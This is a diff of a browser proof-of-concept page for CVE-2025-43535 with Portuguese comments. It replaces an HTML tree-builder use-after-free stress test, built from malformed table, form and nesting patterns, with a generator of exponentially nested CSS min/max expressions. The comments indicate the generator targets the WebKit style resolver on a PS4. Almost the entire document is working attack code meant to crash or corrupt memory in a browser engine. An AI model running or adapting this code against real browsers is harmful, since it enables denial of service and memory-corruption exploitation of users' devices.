@@ -3,22 +3,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — HTML Parser UAF</title>
+<title>CVE-2025-43535 PoC — V1 Otimizada</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
          height:320px; overflow-y:auto; font-size:12px; }
   .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
-  
-  /* Estilos para forçar renderização complexa nos elementos bugados */
-  .stress { display: flex; float: left; position: relative; }
-  table { border-collapse: collapse; }
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption (HTML Tree Builder)</h3>
+<h3>CVE-2025-43535 — Memory Corruption (V1 Max RAM)</h3>
 <div id="log"></div>
-<div id="sandbox" style="display:none;"></div>
 
 <script>
 "use strict";
@@ -28,94 +23,82 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Respiro mínimo, o objetivo é causar condição de corrida (Race Condition) no parser
-const yieldRace = () => new Promise(r => setTimeout(r, 0));
+// Pausa de 300ms para garantir que o GC destruiu as strings no JS
+const yieldGC = () => new Promise(r => setTimeout(r, 300));
 
-async function trigger_html_parser_uaf() {
-  L("[V2] Iniciando stress no HTML Tree Builder C++...");
-  const sandbox = document.getElementById('sandbox');
+async function variant1_css_math_optimized() {
+  L("[V1] Iniciando gerador matemático hiper-minificado...");
 
-  // Padrões tóxicos que forçam os algoritmos de correção de erros do HTML5
-  const malformedPatterns = [
-    // 1. Foster Parenting extremo (Tags ilegais dentro de tabelas)
-    `<table>
-      <div class="stress">Orphan 1</div>
-      <tr>
-        <form><input></form>
-        <td>
-          <table><tr><div class="stress">Orphan 2</div><td>Inner</td></tr></table>
-        </td>
-      </tr>
-    </table>`,
+  const el = document.createElement('div');
+  el.style.cssText = 'position:absolute;top:-9999px';
+  document.body.appendChild(el);
 
-    // 2. Adoption Agency Algorithm (Tags de formatação cruzadas)
-    `<b><i><s><a href="#"><h1>Texto</b></i></s></a></h1>`,
+  let mathCache = {};
+
+  // Função Original, mas gerando a menor string possível em bytes
+  function makeMathNested(depth) {
+    if (depth <= 0) return '1px'; // 1px economiza bytes valiosos em relação a 10px
+    if (mathCache[depth]) return mathCache[depth];
+
+    // Alterna apenas entre min e max. Sem 'clamp' para evitar o 3º argumento que explode a RAM.
+    const f = depth % 2 === 0 ? 'min' : 'max';
     
-    // 3. Form in Form (O parser precisa "ignorar" o segundo form, mas manter o input)
-    `<form id="f1">
-      <input name="a">
-      <form id="f2">
-        <input name="b">
-      </form>
-    </form>`,
-
-    // 4. Misnested lists e misnested inlines com blocos
-    `<ul><li>A<ol><li>B</ul></li></ol>`,
-    `<span><p>Bloco dentro de inline forceja split</p></span>`,
+    // Sem espaços, o mais compacto possível
+    const result = `${f}(${makeMathNested(depth-1)},${makeMathNested(depth-1)})`;
     
-    // 5. SVG e MathML com foreign content mode (Muda a engine de parsing no meio)
-    `<table>
-      <svg><rect><foreignObject><div><table><tr><td>X</td></tr></table></div></foreignObject></rect></svg>
-    </table>`
-  ];
+    mathCache[depth] = result;
+    return result;
+  }
 
-  L("[V2] Bombardeando o DOM com padrões patológicos...");
+  // Com a otimização de bytes, o PS4 deve passar do 26 com folga.
+  const niveisParaTestar = [26, 27, 28];
 
-  // Martelamos a árvore 1000 vezes alterando a estrutura violentamente
-  for (let i = 0; i < 1000; i++) {
+  for (const d of niveisParaTestar) {
+    L(`[V1] Gerando string para nível ${d}...`);
+    
     try {
-      // Pega um padrão aleatório
-      let pattern = malformedPatterns[i % malformedPatterns.length];
+      let payload = makeMathNested(d);
       
-      // Multiplica o padrão algumas vezes para criar uma string média (segura para RAM, pesada para o parser)
-      let payload = pattern.repeat(20);
+      L(`[V1] String gerada. Aplicando no DOM...`);
+      el.style.width = payload;
 
-      // Injeta no DOM via innerHTML (Invoca o HTMLFragmentParsingAlgorithm C++)
-      sandbox.innerHTML = payload;
-
-      // FORÇA O LAYOUT: Isso obriga o C++ a calcular as posições dos ponteiros agorinha mesmo, 
-      // enquanto a árvore pode estar num estado semi-corrompido
-      void sandbox.offsetWidth;
-
-      // Destrói imediatamente. Se o C++ agendou alguma tarefa de correção para o próximo frame,
-      // ele vai tentar acessar memória liberada (UAF).
-      sandbox.innerHTML = '';
-      void sandbox.offsetWidth;
-
-      if (i % 100 === 0) {
-        L(`[V2] Ciclos de mutação completos: ${i}/1000`);
-        await yieldRace();
+      // ==========================================
+      // TRUQUE DE MESTRE: LIBERAÇÃO DE RAM PRÉ-LAYOUT
+      // ==========================================
+      L(`[V1] Deletando string do JS para liberar RAM pro WebKit C++...`);
+      payload = null; 
+      
+      // Se for o último nível, apaga até o cache para dar 100% da RAM pro C++
+      if (d === niveisParaTestar[niveisParaTestar.length - 1]) {
+        mathCache = null; 
       }
+
+      // Aguarda o Garbage Collector do JavaScript agir
+      await yieldGC(); 
+
+      L(`[V1] Disparando Style Resolver (A hora da verdade)...`);
+      await new Promise(r => requestAnimationFrame(r));
+      
+      // Força o C++ a processar a árvore CSSOM que ficou na memória
+      void el.offsetWidth;
+      
+      L(`[V1] Nível ${d} sobreviveu!`, "ok");
     } catch(e) {
-      // Ignoramos erros JS, queremos derrubar a engine C++
+      L(`[V1] Erro no nível ${d}: ${e}`, "fail");
     }
+
+    // Limpeza para o próximo loop
+    el.style.width = '10px';
+    await yieldGC();
   }
 
-  // Estágio final: DOMParser Assíncrono para causar confusão de threads
-  L("[V2] Iniciando stress de parsing assíncrono (DOMParser)...");
-  const parser = new DOMParser();
-  for (let i = 0; i < 500; i++) {
-    let doc = parser.parseFromString(`<!DOCTYPE html><html><body>${malformedPatterns[0]}</body></html>`, 'text/html');
-    void doc.body.innerHTML;
-    if (i % 100 === 0) await yieldRace();
-  }
-
-  L("[V2] Teste finalizado. Se o WebKit tem vulnerabilidade no Tree Builder, o crash deve ter ocorrido.", "ok");
+  document.body.removeChild(el);
+  L("[V1] Teste da Variante 1 concluído.", "ok");
 }
 
 async function main() {
   try {
-    await trigger_html_parser_uaf();
+    await variant1_css_math_optimized();
     L("=== FIM DA EXECUÇÃO ===", "ok");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
